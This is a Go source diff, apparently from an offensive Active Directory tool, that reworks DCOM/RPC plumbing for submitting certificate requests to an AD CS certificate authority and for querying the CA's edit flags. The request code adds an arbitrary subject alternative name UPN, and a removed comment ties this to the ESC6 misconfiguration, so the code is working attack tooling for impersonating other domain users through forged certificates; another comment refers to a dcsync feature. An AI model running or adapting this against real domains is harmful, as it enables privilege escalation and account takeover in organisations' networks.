@@ -31,52 +31,44 @@ import (
 
 // adcsSubmitCSR connects to the CA via DCOM and submits the CSR.
 // Must run in subprocess isolation (--rpc-helper) due to go-msrpc NTLM global state corruption.
+// Follows the same DCOM connection pattern as go-msrpc's wmic.go example.
 func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string, csrDER []byte, cred sspcred.Credential) (*icertrequestd.RequestResponse, error) {
 	epmAddr := net.JoinHostPort(server, "135")
 
-	// Set up security context with SPNEGO/NTLM credentials (same pattern as dcsync)
 	ctx = gssapi.NewSecurityContext(ctx,
 		gssapi.WithCredential(cred),
 		gssapi.WithMechanismFactory(ssp.SPNEGO),
 		gssapi.WithMechanismFactory(ssp.NTLM),
 	)
 
-	// Step 1: ObjectExporter — ServerAlive2 (unauthenticated, just gets COM version)
-	oxConn, err := dcerpc.Dial(ctx, epmAddr)
+	cc, err := dcerpc.Dial(ctx, epmAddr)
 	if err != nil {
 		return nil, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
 	}
-	cli, err := iobjectexporter.NewObjectExporterClient(ctx, oxConn, dcerpc.WithInsecure())
+	defer cc.Close(ctx)
+
+	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc,
+		dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
-		oxConn.Close(ctx)
 		return nil, fmt.Errorf("object exporter client: %w", err)
 	}
 	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
-	oxConn.Close(ctx)
 	if err != nil {
 		return nil, fmt.Errorf("ServerAlive2: %w", err)
 	}
 
-	// Step 2: RemoteActivation on a fresh connection (auth inherited from context)
-	actConn, err := dcerpc.Dial(ctx, epmAddr)
-	if err != nil {
-		return nil, fmt.Errorf("dial EPM for activation: %w", err)
-	}
-	defer actConn.Close(ctx)
-
-	iact, err := iactivation.NewActivationClient(ctx, actConn, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
+	iact, err := iactivation.NewActivationClient(ctx, cc,
+		dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return nil, fmt.Errorf("activation client: %w", err)
 	}
 
-	// ClassID for the certificate request COM class (CertRequestD).
 	certServerClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e74-fc88-11d0-b498-00a0c90312f3"))
-
 	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
 		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
 		ClassID:                    certServerClassID,
 		IIDs:                       []*dcom.IID{icertrequestd.CertRequestDIID},
-		RequestedProtocolSequences: []uint16{7, 15}, // ncacn_ip_tcp, ncacn_np
+		RequestedProtocolSequences: []uint16{7, 15},
 	})
 	if err != nil {
 		return nil, fmt.Errorf("RemoteActivation: %w", err)
@@ -85,34 +77,31 @@ func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string
 		return nil, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
 	}
 
-	// Step 3: Dial the OXID endpoint for the activated object
-	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
-		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
+	conn, err := dcerpc.Dial(ctx, server,
+		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
+			dcerpc.WithSign(), dcerpc.WithTargetName(server))...)
 	if err != nil {
 		return nil, fmt.Errorf("dial OXID endpoint: %w", err)
 	}
 	defer conn.Close(ctx)
 
-	// Step 4: Create WCCE client — fresh security context for the new connection
 	ctx = gssapi.NewSecurityContext(ctx,
 		gssapi.WithCredential(cred),
 		gssapi.WithMechanismFactory(ssp.SPNEGO),
 		gssapi.WithMechanismFactory(ssp.NTLM),
 	)
-	wcceCli, err := wcce_client.NewClient(ctx, conn, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
+	wcceCli, err := wcce_client.NewClient(ctx, conn,
+		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return nil, fmt.Errorf("WCCE client: %w", err)
 	}
 	wcceCli = wcceCli.IPID(ctx, act.InterfaceData[0].IPID())
 
-	// Step 6: Build request attributes
 	attrs := fmt.Sprintf("CertificateTemplate:%s\n", template)
 	if altName != "" {
-		// Also set SAN via attributes for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
 		attrs += fmt.Sprintf("SAN:upn=%s\n", altName)
 	}
 
-	// Step 7: Submit the certificate request
 	resp, err := wcceCli.CertRequestD().Request(ctx, &icertrequestd.RequestRequest{
 		This:       &dcom.ORPCThis{Version: srv.COMVersion},
 		Flags:      crInPKCS10,
@@ -141,37 +130,30 @@ const editfAttributeSubjectAltName2 = 0x00040000
 func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred.Credential) (uint32, error) {
 	epmAddr := net.JoinHostPort(server, "135")
 
-	// Set up security context with SPNEGO/NTLM credentials (same pattern as dcsync)
 	ctx = gssapi.NewSecurityContext(ctx,
 		gssapi.WithCredential(cred),
 		gssapi.WithMechanismFactory(ssp.SPNEGO),
 		gssapi.WithMechanismFactory(ssp.NTLM),
 	)
 
-	// ObjectExporter — ServerAlive2 (unauthenticated, separate connection)
-	oxConn, err := dcerpc.Dial(ctx, epmAddr)
+	cc, err := dcerpc.Dial(ctx, epmAddr)
 	if err != nil {
 		return 0, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
 	}
-	cli, err := iobjectexporter.NewObjectExporterClient(ctx, oxConn, dcerpc.WithInsecure())
+	defer cc.Close(ctx)
+
+	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc,
+		dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
-		oxConn.Close(ctx)
 		return 0, fmt.Errorf("object exporter client: %w", err)
 	}
 	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
-	oxConn.Close(ctx)
 	if err != nil {
 		return 0, fmt.Errorf("ServerAlive2: %w", err)
 	}
 
-	// RemoteActivation on a fresh connection (auth inherited from context)
-	actConn, err := dcerpc.Dial(ctx, epmAddr)
-	if err != nil {
-		return 0, fmt.Errorf("dial EPM for activation: %w", err)
-	}
-	defer actConn.Close(ctx)
-
-	iact, err := iactivation.NewActivationClient(ctx, actConn, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
+	iact, err := iactivation.NewActivationClient(ctx, cc,
+		dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return 0, fmt.Errorf("activation client: %w", err)
 	}
@@ -190,21 +172,21 @@ func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred
 		return 0, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
 	}
 
-	// Dial OXID endpoint
-	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
-		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
+	conn, err := dcerpc.Dial(ctx, server,
+		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
+			dcerpc.WithSign(), dcerpc.WithTargetName(server))...)
 	if err != nil {
 		return 0, fmt.Errorf("dial OXID endpoint: %w", err)
 	}
 	defer conn.Close(ctx)
 
-	// Create CSRA client — fresh security context for new connection
 	ctx = gssapi.NewSecurityContext(ctx,
 		gssapi.WithCredential(cred),
 		gssapi.WithMechanismFactory(ssp.SPNEGO),
 		gssapi.WithMechanismFactory(ssp.NTLM),
 	)
-	csraCli, err := csra_client.NewClient(ctx, conn, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
+	csraCli, err := csra_client.NewClient(ctx, conn,
+		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return 0, fmt.Errorf("CSRA client: %w", err)
 	}
